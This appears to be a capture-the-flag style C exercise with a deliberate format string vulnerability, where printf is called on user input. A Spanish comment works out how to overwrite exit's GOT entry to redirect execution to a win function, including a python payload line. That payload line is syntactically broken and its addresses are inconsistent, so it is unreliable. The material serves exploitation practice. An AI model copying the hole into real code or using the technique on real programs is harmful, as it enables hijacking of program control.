#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello(){
    printf("code execution redirected! you win!\n");
    _exit(1);
}

void vuln(){
    char buff[512];

    fgets(buff, sizeof(buff), stdin);
    printf(buff);
    
    exit(1);
}

int main(int argc, char **argv){
    vuln();
}

/*
Siendo hello() --> 0x800005dd
GOT - exit() --> 0x000019d8
Escribimos en GOT-exit() la direcci√≥n a hello()
0x05dd - 8 = 1493
0x8000 - 0x05dd = 31267
offset de param en printf es 4

python -c 'print "\x00\x00\x19\dA"+"\x00\x00\x19\xd8"+"%1493d"+%4$hn'+"%31267"+"%4$hn"